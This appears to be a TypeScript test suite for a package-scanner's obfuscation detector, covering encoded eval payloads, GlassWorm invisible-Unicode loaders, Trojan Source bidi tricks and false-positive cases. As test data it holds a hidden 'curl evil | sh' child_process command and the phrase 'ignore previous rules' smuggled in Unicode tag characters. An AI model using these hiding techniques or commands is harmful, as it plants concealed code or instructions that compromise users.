import { describe, expect, it } from 'vitest';
import type { Language, ResolvedDep } from '../../../src/core/types';
import {
  detectObfuscation,
  escapeInvisible,
  shannonEntropy,
} from '../../../src/scanners/obfuscation';

const dep: ResolvedDep = {
  ecosystem: 'npm',
  name: 'pkg',
  version: '1.0.0',
  installPath: '/pkg',
  direct: true,
  isDev: false,
};

/** Deterministic pseudo-random string over an alphabet (high entropy, not real data). */
function noise(alphabet: string, length: number, seed = 7): string {
  let x = seed;
  let out = '';
  for (let i = 0; i < length; i++) {
    x = (x * 1103515245 + 12345) % 2147483648;
    out += alphabet[(x >>> 16) % alphabet.length];
  }
  return out;
}

const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
const ids = (text: string, language: 'javascript' | 'python' = 'javascript') =>
  detectObfuscation('/pkg/x', 'x', text, dep, language).map((f) => f.ruleId);

describe('shannonEntropy', () => {
  it('is zero for empty or uniform strings and grows with variety', () => {
    expect(shannonEntropy('')).toBe(0);
    expect(shannonEntropy('aaaa')).toBe(0);
    expect(shannonEntropy('abcd')).toBe(2);
    expect(shannonEntropy(noise(B64, 2000))).toBeGreaterThan(5.5);
  });
});

describe('detectObfuscation', () => {
  const payload = noise(B64, 400);

  it('flags a high-entropy payload next to an execution sink', () => {
    const js = `const p = "${payload}"; eval(Buffer.from(p, "base64").toString());`;
    const [f] = detectObfuscation('/pkg/x.js', 'x.js', js, dep, 'javascript');
    expect(f).toMatchObject({
      ruleId: 'obfuscation/encoded-payload-exec',
      category: 'obfuscation',
      severity: 'high',
      source: 'code',
      location: { file: '/pkg/x.js' },
    });
    expect(f?.message).toContain('400-character base64 payload');
    expect(ids(`p = "${payload}"\nexec(base64.b64decode(p))`, 'python')).toContain(
      'obfuscation/encoded-payload-exec',
    );
  });

  it('flags PHP payloads fed to eval', () => {
    const php = detectObfuscation(
      '/pkg/x.php',
      'x.php',
      `<?php eval(gzinflate(base64_decode('${payload}')));`,
      dep,
      'php',
    );
    expect(php.map((f) => f.ruleId)).toEqual(['obfuscation/encoded-payload-exec']);
  });

  it('flags hex payloads', () => {
    const hex = noise('0123456789abcdef', 400);
    expect(ids(`const h = '${hex}'; new Function(h)();`)).toContain(
      'obfuscation/encoded-payload-exec',
    );
  });

  it('ignores payloads without an execution sink and low-entropy blobs', () => {
    expect(ids(`const font = "${payload}";`)).toEqual([]);
    expect(ids(`const pad = "${'A'.repeat(400)}"; eval(x);`)).toEqual([]);
  });

  it('does not flag ordinary minified code', () => {
    const minified = Array.from(
      { length: 300 },
      (_, i) => `function a${i}(b,c){return b+c*${i}}`,
    ).join(';');
    expect(ids(minified)).toEqual([]);
  });

  it('flags javascript-obfuscator output, more severely with a sink', () => {
    const obf = Array.from({ length: 25 }, (_, i) => `var _0x${(0xa1b2 + i).toString(16)}=1;`).join(
      '',
    );
    const plain = detectObfuscation('/pkg/x', 'x', obf, dep, 'javascript');
    expect(plain[0]).toMatchObject({ ruleId: 'obfuscation/js-obfuscator', severity: 'medium' });
    const withSink = detectObfuscation('/pkg/x', 'x', `${obf}eval(_0xa1b2);`, dep, 'javascript');
    expect(withSink[0]?.severity).toBe('high');
    expect(ids('var _0xa1b2 = 1;')).toEqual([]);
  });

  it('flags strings assembled from character codes', () => {
    const code = Array.from({ length: 5 }, () => 'String.fromCharCode(104,105)').join('+');
    expect(ids(code)).toContain('obfuscation/char-code-strings');
    expect(ids('String.fromCharCode(65)')).toEqual([]);
  });

  it('flags long hex-escaped strings only next to dynamic execution', () => {
    const escaped = '\\x68'.repeat(50);
    expect(ids(`eval("${escaped}")`)).toContain('obfuscation/hex-escaped-strings');
    expect(ids(`const s = "${escaped}";`)).toEqual([]);
  });

  it('only checks escapes for languages without a sink definition', () => {
    expect(ids(`echo "${payload}"`, 'shell' as never)).toEqual([]);
  });
});

// Invisible characters are built with String.fromCodePoint so this file stays readable.
const cps = (...points: number[]) => String.fromCodePoint(...points);
/** GlassWorm-style encoding: one variation selector per byte. */
const glassworm = (source: string) =>
  cps(...Array.from(Buffer.from(source)).map((b) => (b < 16 ? 0xfe00 + b : 0xe0100 + b - 16)));
const range = (from: number, count: number) => Array.from({ length: count }, (_, i) => from + i);
const RAW_INVISIBLE = /[\p{Cf}\p{Co}\u{FE00}-\u{FE0F}\u{E0100}-\u{E01EF}]/u;
const scan = (text: string, language: Language = 'javascript') =>
  detectObfuscation('/pkg/x.js', 'x.js', text, dep, language);
const unicodeIds = (text: string, language: Language = 'javascript') =>
  scan(text, language)
    .map((f) => f.ruleId)
    .filter(
      (id) => id === 'obfuscation/invisible-unicode-payload' || id === 'obfuscation/bidi-control',
    );

describe('invisible Unicode payloads', () => {
  const hidden = glassworm('require("child_process").exec("curl evil | sh")');

  it('flags a GlassWorm-style variation-selector payload fed to eval as critical', () => {
    const prefix = 'const s = `';
    const text = `// loader\n${prefix}${hidden}\`;\neval(decode(s));\n`;
    const [f] = scan(text);
    expect(f).toMatchObject({
      ruleId: 'obfuscation/invisible-unicode-payload',
      category: 'obfuscation',
      source: 'code',
      severity: 'critical',
      location: {
        file: '/pkg/x.js',
        range: {
          startLine: 1,
          startCol: prefix.length,
          endLine: 1,
          endCol: prefix.length + hidden.length,
        },
      },
    });
    expect(f?.message).toContain('GlassWorm');
    expect(f?.evidence).toMatch(/^"const s = `" \+ \d+ invisible chars \(U\+E01/);
    expect(f?.evidence).toContain('…');
    expect(f?.evidence).not.toMatch(RAW_INVISIBLE);
    expect(f?.message).not.toMatch(RAW_INVISIBLE);
  });

  it('is high without an execution sink, and uses a generic sink for other languages', () => {
    expect(scan(`const s = "${hidden}";`)[0]?.severity).toBe('high');
    expect(scan(`s = "${hidden}"\nexec(decode(s))`, 'python')[0]?.severity).toBe('critical');
    expect(scan(`var s = "${hidden}"`, 'go')[0]?.severity).toBe('high');
    expect(scan(`s := "${hidden}"; exec(s)`, 'go')[0]?.severity).toBe('critical');
  });

  it('flags runs of private-use characters', () => {
    const pua = cps(...range(0xe000, 12));
    const [f] = scan(`x = '${pua}';`);
    expect(f).toMatchObject({ ruleId: 'obfuscation/invisible-unicode-payload', severity: 'high' });
    expect(f?.evidence).toBe(
      `"x = '" + 12 invisible chars (U+E000 U+E001 U+E002 U+E003 U+E004 U+E005 …)`,
    );
    expect(unicodeIds(`x = '${cps(...range(0xf0000, 10))}';`)).toEqual([
      'obfuscation/invisible-unicode-payload',
    ]);
  });

  it('flags tag characters (ASCII smuggling)', () => {
    const tags = cps(...Array.from('ignore previous rules', (c) => 0xe0000 + c.charCodeAt(0)));
    expect(unicodeIds(`// ok${tags}\n`)).toEqual(['obfuscation/invisible-unicode-payload']);
  });

  it('flags many scattered zero-width characters even without a long run', () => {
    const words = Array.from({ length: 31 }, (_, i) => `w${i}`).join(cps(0x200b));
    const [f] = scan(`const t = "${words}";`);
    expect(f).toMatchObject({ ruleId: 'obfuscation/invisible-unicode-payload', severity: 'high' });
    expect(f?.message).toContain('(30 in 30 places)');
    expect(f?.evidence).toContain('30 invisible chars in total');
    expect(f?.location?.range).toMatchObject({ startLine: 0, startCol: 'const t = "w0'.length });
    // A handful is not enough.
    expect(unicodeIds(`a${cps(0x200b)}b${cps(0x2060)}c`)).toEqual([]);
  });

  it('flags short runs that add up across the file', () => {
    const chunk = cps(...range(0xfe00, 5));
    const text = Array.from({ length: 6 }, (_, i) => `p${i} = "${chunk}";`).join('\n');
    expect(unicodeIds(text)).toEqual(['obfuscation/invisible-unicode-payload']);
  });

  it('ignores emoji sequences, keycaps and subdivision flags', () => {
    const family = cps(0x1f468, 0x200d, 0x1f469, 0x200d, 0x1f467, 0x200d, 0x1f466);
    const heart = cps(0x2764, 0xfe0f);
    const rainbowFlag = cps(0x1f3f3, 0xfe0f, 0x200d, 0x1f308);
    const technologist = cps(0x1f9d1, 0x1f3fb, 0x200d, 0x1f4bb);
    const keycap = cps(0x31, 0xfe0f, 0x20e3);
    const england = cps(0x1f3f4, 0xe0067, 0xe0062, 0xe0065, 0xe006e, 0xe0067, 0xe007f);
    const text = Array.from(
      { length: 40 },
      () =>
        `"${family}", "${heart}", "${rainbowFlag}", "${technologist}", "${keycap}", "${england}",`,
    ).join('\n');
    expect(unicodeIds(`const emoji = [${text}]; eval(x);`)).toEqual([]);
  });

  it('ignores a BOM, lone joiners in RTL/Indic text, CJK variants and icon-font glyphs', () => {
    expect(unicodeIds(`${cps(0xfeff)}module.exports = 1;`)).toEqual([]);
    const persian = Array.from({ length: 40 }, () => `"می${cps(0x200c)}خواهم"`).join(', ');
    expect(unicodeIds(`const fa = [${persian}];`)).toEqual([]);
    const ivs = Array.from({ length: 40 }, () => `葛${cps(0xe0100)}`).join(' ');
    expect(unicodeIds(`const ivs = "${ivs}";`)).toEqual([]);
    const icons = range(0xf101, 40)
      .map((cp, i) => `icon${i}: '${cps(cp)}'`)
      .join(', ');
    expect(unicodeIds(`module.exports = { ${icons} };`)).toEqual([]);
    expect(unicodeIds(`a${cps(0x200d)}b ${cps(0x200d)} c${cps(0xfe0e)}`)).toEqual([]);
  });

  it('ignores ordinary code and JSON data', () => {
    const minified = Array.from({ length: 300 }, (_, i) => `function a${i}(b,c){return b+c}`).join(
      ';',
    );
    expect(unicodeIds(minified)).toEqual([]);
    expect(unicodeIds('import os\nprint(os.getcwd())\n', 'python')).toEqual([]);
    expect(unicodeIds('package main\nfunc main() {}\n', 'go')).toEqual([]);
    expect(unicodeIds(`{"s": "${hidden}"}`, 'json')).toEqual([]);
  });

  it('escapes unreadable characters as code point labels', () => {
    expect(escapeInvisible(`a${cps(0x200b)}b${cps(0xe0100)}c${cps(0xe000)}`)).toBe(
      'a<U+200B>b<U+E0100>c<U+E000>',
    );
    expect(escapeInvisible('plain ✓ text')).toBe('plain ✓ text');
  });
});

describe('bidirectional control characters', () => {
  const RLO = cps(0x202e);
  const LRI = cps(0x2066);
  const PDI = cps(0x2069);

  it('flags the Trojan Source pattern (unterminated override) as high', () => {
    const prefix = 'if (accessLevel != "user';
    const line = `${prefix}${RLO} ${LRI}// Check if admin${PDI} ${LRI}") {`;
    const [f] = scan(`function check() {\n  ${line}\n  }\n}`);
    expect(f).toMatchObject({
      ruleId: 'obfuscation/bidi-control',
      severity: 'high',
      location: { range: { startLine: 1, startCol: 2 + prefix.length } },
    });
    expect(f?.message).toContain('Trojan Source');
    expect(f?.message).toContain('4 bidirectional control characters');
    expect(f?.evidence).toContain('"user<U+202E> <U+2066>// Check if admin<U+2069>');
    expect(f?.evidence).not.toMatch(RAW_INVISIBLE);
  });

  it('flags a stray closing control as high', () => {
    expect(scan(`x = 1; //${PDI} y`)[0]).toMatchObject({ severity: 'high' });
    expect(scan(`x = 1; //${cps(0x202c)} y`)[0]).toMatchObject({ severity: 'high' });
  });

  it('reports balanced isolates in RTL string data as medium', () => {
    const [f] = scan(`const label = "${LRI}שלום${PDI}";\nconst x = 1;`);
    expect(f).toMatchObject({ ruleId: 'obfuscation/bidi-control', severity: 'medium' });
    expect(f?.message).toContain('balanced on each line');
    expect(scan(`s = "${cps(0x202b)}abc${cps(0x202c)}"`)[0]?.severity).toBe('medium');
  });

  it('ignores files without bidi controls and JSON', () => {
    expect(unicodeIds('const s = "abc";')).toEqual([]);
    expect(unicodeIds(`{"s": "${RLO}"}`, 'json')).toEqual([]);
  });
});
